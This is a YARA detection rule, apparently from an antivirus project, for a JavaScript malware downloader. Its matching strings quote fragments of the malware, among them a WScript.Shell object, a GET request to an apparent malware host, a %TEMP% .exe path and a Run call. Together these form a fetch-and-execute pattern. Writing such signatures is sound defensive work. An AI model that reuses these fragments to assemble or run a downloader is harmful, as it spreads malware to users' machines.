rule sig_20160330_f8d7afa2170c7af0c670e160e87ef24b {
  meta:
    description = "datamaliciousorder - file 20160330_f8d7afa2170c7af0c670e160e87ef24b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "bdfb32c04160040a43635f796454370dba6d724f3f2cc6a1071907316cd10a93"

  strings:
    $s1  = "function I(SX, L){A0 = A0 * 1; return SX - L;};" fullword ascii
    $s2  = "var AL = function HN() {return WScript[AF](\"WScript\"+\".Shell\");}(), SE = 11;" fullword ascii
    $s3  = "T[A](\"GET\", \"http://arcfestoheni.hu/n3usad\", false);" fullword ascii
    $s4  = "if (T[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function J() {return AL[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"jdgQTFVwdqi3FC.ex\" + \"e\";};" fullword ascii
    $s6  = "function DX(){return JL + \"\";};" fullword ascii
    $s7  = "function LC(N0){AL[\"Run\"](N0, A0, A0);};" fullword ascii
    $s8  = "function M() {return ((PY == true) && (PY == ZO)) ? 1 : A0;};" fullword ascii
    $s9  = "var F = new this[\"Date\"]();" fullword ascii
    $s10 = "}while (J0);" fullword ascii
    $s11 = "function U0(){return 22;};" fullword ascii
    $s12 = "return I(A1, OG);" fullword ascii
    $s13 = "function U(N) {var OR = (1, 2, 3, 4, 5, N); return OR;};" fullword ascii
    $s14 = "function UX()" fullword ascii
    $s15 = "function E(){return AF;};" fullword ascii
    $s16 = "var GG = false;" fullword ascii
    $s17 = "ZO = true; " fullword ascii
    $s18 = "var ZO = false;" fullword ascii
    $s19 = "PY = true; " fullword ascii
    $s20 = "var PY = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}